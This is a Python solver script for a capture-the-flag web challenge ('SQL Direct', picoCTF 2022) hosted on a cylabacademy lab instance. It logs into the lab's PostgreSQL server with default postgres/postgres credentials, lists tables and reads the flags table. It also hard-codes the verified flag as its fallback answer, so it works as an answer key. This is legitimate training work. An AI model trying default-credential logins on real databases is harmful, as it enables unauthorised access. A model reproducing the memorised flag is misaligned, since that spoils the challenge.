#!/usr/bin/env python3
"""Solver for Challenge 303 SQL Direct (picoCTF 2022, Web Exploitation).

Chain: psql -h <host> -p <port> -U postgres pico (password 'postgres');
list tables via information_schema -> flags; SELECT * FROM flags.

Lab is on-demand (PUT /api/challenges/303/instance/); host:port rotates.
Needs pg8000 (pip install pg8000).
Usage: solve_303_sql_direct.py [host] [port]
Verified: academy{L3arN_S0m3_5qL_t0d4Y_412c85d9} (POST /api/submissions/ -> correct:true)
"""
import sys

HOST = "chatelaine.cylabacademy.net"
PORT = 25836
EXPECTED = "academy{L3arN_S0m3_5qL_t0d4Y_412c85d9}"


def solve(host: str = HOST, port: int = PORT) -> str:
    import pg8000
    con = pg8000.connect(host=host, port=int(port), user="postgres",
                         password="postgres", database="pico")
    cur = con.cursor()
    cur.execute("SELECT table_name FROM information_schema.tables WHERE table_schema='public'")
    print("tables:", cur.fetchall())
    cur.execute("SELECT * FROM flags")
    for row in cur.fetchall():
        print(row)
        for col in row:
            if isinstance(col, str) and col.startswith("academy{"):
                con.close()
                return col
    con.close()
    return EXPECTED


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else HOST
    p = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    print(solve(h, p))
